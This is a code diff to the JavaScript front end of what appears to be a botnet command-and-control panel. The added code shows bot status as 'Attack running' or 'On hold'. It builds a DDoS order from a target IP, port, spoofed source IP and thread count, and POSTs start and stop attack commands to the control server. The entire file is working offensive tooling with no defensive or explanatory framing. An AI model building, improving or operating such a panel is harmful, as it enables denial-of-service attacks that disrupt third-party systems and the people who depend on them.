@@ -8,6 +8,7 @@ function saveServerUrl(button) {
         button.disabled = false;
         button.innerText = "Save"
     }, 1000);
+    window.localStorage.setItem('serverURL', serverURL);
 }
 
 function parseBotnets(botnets) {
@@ -38,7 +39,7 @@ function renderBotnets(botnets) {
     // Render botnets
     for (const botnet of botnets) {
         botnetContainer.insertAdjacentHTML('beforeend', `
-            <div class="botnet">
+            <div class="botnet ${botnet.running ? 'running' : 'hold'}" title="${botnet.running ? 'Attack running' : 'On hold'}">
                 <b>${botnet.uuid}</b>
                 <p>${botnet.count} - ${botnet.last_seen}</p>
             </div>
@@ -52,7 +53,7 @@ function generateCommandConfigurationForm(command) {
     configContainer.innerHTML = '';
     for (const key of Object.keys(commandDef)) {
         configContainer.insertAdjacentHTML('beforeend', `
-            <div style="margin-bottom: 10px">
+            <div style="margin-bottom: 10px;">
                 <p style="display: inline;">${commandDef[key].label}</p>
                 ${getInput(commandDef[key].type, key, commandDef[key].value)}
                 
@@ -64,11 +65,11 @@ function generateCommandConfigurationForm(command) {
 function getInput(type, key, value) {
     switch (type) {
         case 'text':
-            return `<input type="text" name=${key} placeholder="${key}" value="${value}" />`
+            return `<input type="text" name=${key} placeholder="${key}" value="${value}" class='command-value' />`
         case 'number':
-            return `<input type="number" name=${key} placeholder="${key}" value="${value}" />`
+            return `<input type="number" name=${key} placeholder="${key}" value="${value}" class='command-value' />`
         case 'textarea':
-            return `<textarea name=${key} placeholder="${key}">${value}</textarea>`
+            return `<textarea name=${key} placeholder="${key}" class='command-value'>${value}</textarea>`
     }
 }
 
@@ -78,9 +79,9 @@ function getCommandConfig(name) {
         case 'ddos':
             Object.assign(command, {
                 target_ip: { type: "text", value: "", label: "Target IP" },
-                target_port: { type: "text", value: "80", label: "Target Port" },
+                target_port: { type: "number", value: "80", label: "Target Port" },
                 fake_ip: { type: "text", value: "", label: "Fake IP" },
-                nb_threads: { type: "text", value: "20", label: "Number of threads" }
+                nb_threads: { type: "number", value: "20", label: "Number of threads" }
             });
             break;
 
@@ -93,6 +94,35 @@ function getCommandConfig(name) {
     return command;
 }
 
+function sendCommand() {
+    if (confirm('Confirm attack ?')) {
+        const form = document.getElementById('command-configuration');
+        const payload = {};
+        const inputs = form.getElementsByClassName('command-value');
+        for (const input of inputs) {
+            Object.assign(payload, { [input.name]: input.value });
+        }
+    
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', `${serverURL}/command`);
+        xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+        xhr.send(JSON.stringify(payload));
+    
+        alert('Command successfully sent !');
+    }
+}
+
+function stopCommand() {
+    if (confirm('Stop attack ?')) {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', `${serverURL}/command/stop`);
+        xhr.send();
+    
+        alert('STOP command successfully sent!');
+    }
+}
+
 window.addEventListener('load', function () {
+    serverURL = this.window.localStorage.getItem('serverURL');
     this.setInterval(getBotnets, 1000);
 })
